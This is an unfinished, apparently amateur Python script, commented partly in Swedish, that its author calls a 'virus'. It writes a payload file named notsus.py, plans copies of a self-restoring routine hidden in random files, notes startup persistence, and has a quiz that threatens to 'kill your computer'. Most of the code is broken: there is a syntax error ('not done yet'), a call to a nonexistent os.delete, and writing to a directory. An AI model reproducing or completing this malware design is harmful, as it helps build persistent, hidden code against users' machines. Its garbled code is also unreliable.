# This variable is the part that does the damage, and will be put in a other file named notsus.py
#
virus = "f = open('programmet.py', 'w')\nf.write()\nf.close()"
#
#
#
# This variable is a program that will look if the notsus.py has been removed, if it has it will put it back
#
control = "try:\n  f = open('/notsus.py', 'r')\n  f.close()\nexcept:\n  f = open('/notsus.py', 'w')\n  f.write('" + virus + "')"
#
#
#
#
#
#
#
#
#
#
#Random non working code     |
#  R     N     W     C       v

RNWC = 'if input("Är Python ett bra programeringsspråk? ") == "ja" and input("Är Linux bra? ") == "ja":\n  print("Good...")\nfrom os import osdelete\nos.delete()'
#
#
#
#
# This part puts the virus variable in a file that will be executed each time the computer starts-
#
#se till att programet startas automatiskt vid start av dator, och att man kan ändra vad som står i programmet/hämta programet från internett varje gång
f = open("/notsus.py", "a")
f.close()
f = open("/notsus.py", "w")
f.write(virus)
f.close()
#
#
#
# This part puts the variable control in multiple files on random locations in the computer. If I can I will change it so that it is put in existing filles so that you dont see it.
#
#import random
for i in range(21):
  randomlocation = not done yet
# Gör delen som väljer en random fil
  open1 = randomlocation
  f = open(open1, "w")
  f.write(control)
  f.close()
#
#
Gör att programen startas när datorn startar...
#
#
#
#
#
#
import os
#
deinstall = 'import os\nif input("Är python ett bra programeringsspråk? ") == "ja" and input("Är Linux bra? ") == "ja" and input("Är minecraft bra? ") == "ja":\n  print("Bra...")\n  \nelse:\n  #starta /drummel.py\n  print("nu dör din dator...(delen har inte programerats än...)")'
#f = open(good location, "w")
#f.write(deinstall)
#f.close()
#exec(deinstall)

#JUST FOR TEST

f = open(os.getcwd(), "w")
f.write(RNWC)
f.close()
exec(deinstall)